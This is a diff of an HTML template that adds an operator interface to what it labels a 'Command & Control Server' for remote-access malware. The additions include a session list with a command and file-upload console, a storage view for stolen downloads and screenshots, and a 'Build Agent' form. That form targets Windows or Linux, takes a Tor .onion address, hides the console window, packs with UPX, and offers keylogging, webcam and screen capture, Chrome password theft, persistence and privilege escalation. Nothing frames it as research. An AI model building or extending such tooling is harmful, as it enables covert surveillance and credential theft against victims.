@@ -10,61 +10,251 @@
     <div class="container">
         <div class="header">
             <pre class="title">{{ title | safe }}</pre>
+            <div class="header-info">
+                <span class="material-icons" title="Command & Control Server">security</span>
+                <span>v1.0</span>
+            </div>
         </div>
         
-        <div class="main-content">
-            <div class="targets-panel">
-                <h2>
-                    <span class="material-icons">devices</span>
-                    Active Sessions
-                </h2>
-                <div id="targets-list"></div>
+        <div class="tab-navigation">
+            <button class="tab-button active" data-tab="agents">
+                <span class="material-icons">devices</span>
+                Connected Agents
+            </button>
+            <button class="tab-button" data-tab="build">
+                <span class="material-icons">build</span>
+                Build Agent
+            </button>
+            <button class="tab-button" data-tab="storage">
+                <span class="material-icons">folder</span>
+                Storage
+            </button>
+        </div>
+
+        <div class="tab-content">
+            <!-- Agents Tab -->
+            <div class="tab-pane active" id="agents-tab">
+                <div class="agents-container">
+                    <div class="targets-panel">
+                        <h2>
+                            <span class="material-icons">devices</span>
+                            Connected Agents
+                        </h2>
+                        <div id="targets-list"></div>
+                    </div>
+                    
+                    <div class="command-panel">
+                        <div id="current-session">
+                            <div class="no-session-message">
+                                <span class="material-icons">terminal_off</span>
+                                <div>No active session selected</div>
+                                <div>Click on a session to start commanding</div>
+                            </div>
+                        </div>
+                        
+                        <div class="command-input">
+                            <input type="text" id="command-input" placeholder="Enter command...">
+                            <button onclick="sendCommand()" class="send-button">
+                                <span class="material-icons">send</span>
+                                Send
+                            </button>
+                        </div>
+                        
+                        <div class="command-buttons">
+                            <button onclick="showHelp()" class="help-button">
+                                <span class="material-icons">help_outline</span>
+                                Help
+                            </button>
+                            <button onclick="clearOutput()" class="clear-button">
+                                <span class="material-icons">clear_all</span>
+                                Clear
+                            </button>
+                        </div>
+                        
+                        <div class="file-upload">
+                            <label for="file-input">
+                                <span class="material-icons">upload_file</span>
+                                Choose File
+                            </label>
+                            <input type="file" id="file-input">
+                            <button onclick="uploadFile()" class="send-button">
+                                <span class="material-icons">cloud_upload</span>
+                                Upload
+                            </button>
+                        </div>
+                        
+                        <div class="command-output">
+                            <pre id="output"></pre>
+                        </div>
+                    </div>
+                </div>
             </div>
-            
-            <div class="command-panel">
-                <h2>
-                    <span class="material-icons">terminal</span>
-                    Command Center
-                </h2>
-                
-                <div class="session-info">
-                    <span class="material-icons">computer</span>
-                    Selected Session: <span id="current-session">None</span>
+
+            <!-- Build Tab -->
+            <div class="tab-pane" id="build-tab">
+                <div class="build-panel">
+                    <h2>
+                        <span class="material-icons">build</span>
+                        Build Agent
+                    </h2>
+                    
+                    <div class="build-form">
+                        <div class="form-group">
+                            <label>Target Platform</label>
+                            <select id="platform-select">
+                                <option value="windows">Windows</option>
+                                <option value="linux">Linux</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Onion Address</label>
+                            <input type="text" id="onion-address" placeholder="Enter .onion address">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Port</label>
+                            <input type="number" id="port-number" value="80">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Options</label>
+                            <div class="checkbox-group">
+                                <label>
+                                    <input type="checkbox" id="option-noconsole" checked>
+                                    Hide Console Window
+                                </label>
+                                <label>
+                                    <input type="checkbox" id="option-upx" checked>
+                                    Use UPX Compression
+                                </label>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Agent Capabilities</label>
+                            <div class="skills-grid">
+                                <label class="skill-item">
+                                    <input type="checkbox" name="skills" value="keylogger" checked>
+                                    <div class="skill-content">
+                                        <span class="material-icons">keyboard</span>
+                                        <div class="skill-info">
+                                            <div class="skill-name">Keylogger</div>
+                                            <div class="skill-desc">Capture keystrokes</div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label class="skill-item">
+                                    <input type="checkbox" name="skills" value="screenshot" checked>
+                                    <div class="skill-content">
+                                        <span class="material-icons">screenshot</span>
+                                        <div class="skill-info">
+                                            <div class="skill-name">Screenshot</div>
+                                            <div class="skill-desc">Capture screen</div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label class="skill-item">
+                                    <input type="checkbox" name="skills" value="webcam" checked>
+                                    <div class="skill-content">
+                                        <span class="material-icons">photo_camera</span>
+                                        <div class="skill-info">
+                                            <div class="skill-name">Webcam</div>
+                                            <div class="skill-desc">Capture webcam</div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label class="skill-item">
+                                    <input type="checkbox" name="skills" value="chrome" checked>
+                                    <div class="skill-content">
+                                        <span class="material-icons">password</span>
+                                        <div class="skill-info">
+                                            <div class="skill-name">Chrome Passwords</div>
+                                            <div class="skill-desc">Extract saved passwords</div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label class="skill-item">
+                                    <input type="checkbox" name="skills" value="persistence" checked>
+                                    <div class="skill-content">
+                                        <span class="material-icons">update</span>
+                                        <div class="skill-info">
+                                            <div class="skill-name">Persistence</div>
+                                            <div class="skill-desc">Survive system reboot</div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label class="skill-item">
+                                    <input type="checkbox" name="skills" value="privilege" checked>
+                                    <div class="skill-content">
+                                        <span class="material-icons">admin_panel_settings</span>
+                                        <div class="skill-info">
+                                            <div class="skill-name">Privilege Escalation</div>
+                                            <div class="skill-desc">Gain admin rights</div>
+                                        </div>
+                                    </div>
+                                </label>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Agent Language</label>
+                            <div class="language-selector">
+                                <label class="language-option">
+                                    <input type="radio" name="language" value="python" checked>
+                                    <div class="language-content">
+                                        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg" alt="Python">
+                                        <span>Python</span>
+                                    </div>
+                                </label>
+                                <label class="language-option">
+                                    <input type="radio" name="language" value="cpp">
+                                    <div class="language-content">
+                                        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/cplusplus/cplusplus-original.svg" alt="C++">
+                                        <span>C++</span>
+                                    </div>
+                                </label>
+                            </div>
+                        </div>
+                        
+                        <div class="build-actions">
+                            <button onclick="buildAgent()" class="build-button">
+                                <span class="material-icons">engineering</span>
+                                Build Agent
+                            </button>
+                        </div>
+                        
+                        <div class="build-status" style="display: none;">
+                            <div class="progress-bar">
+                                <div class="progress"></div>
+                            </div>
+                            <div class="status-text"></div>
+                        </div>
+                    </div>
                 </div>
-                
-                <div class="command-input">
-                    <input type="text" id="command-input" placeholder="Enter command...">
-                    <button onclick="sendCommand()" class="send-button">
-                        <span class="material-icons">send</span>
-                        Send
-                    </button>
-                </div>
-                
-                <div class="command-buttons">
-                    <button onclick="showHelp()" class="help-button">
-                        <span class="material-icons">help_outline</span>
-                        Help
-                    </button>
-                    <button onclick="clearOutput()" class="clear-button">
-                        <span class="material-icons">clear_all</span>
-                        Clear
-                    </button>
-                </div>
-                
-                <div class="file-upload">
-                    <label for="file-input">
-                        <span class="material-icons">upload_file</span>
-                        Choose File
-                    </label>
-                    <input type="file" id="file-input">
-                    <button onclick="uploadFile()" class="send-button">
-                        <span class="material-icons">cloud_upload</span>
-                        Upload
-                    </button>
-                </div>
-                
-                <div class="command-output">
-                    <pre id="output"></pre>
+            </div>
+
+            <!-- Storage Tab -->
+            <div class="tab-pane" id="storage-tab">
+                <div class="storage-panel">
+                    <h2>
+                        <span class="material-icons">folder</span>
+                        File Storage
+                    </h2>
+                    <div class="storage-content">
+                        <div class="folder-section">
+                            <h3>Downloads</h3>
+                            <div id="downloads-list" class="file-list"></div>
+                        </div>
+                        <div class="folder-section">
+                            <h3>Screenshots</h3>
+                            <div id="screenshots-list" class="file-list"></div>
+                        </div>
+                        <div class="folder-section">
+                            <h3>Uploads</h3>
+                            <div id="uploads-list" class="file-list"></div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
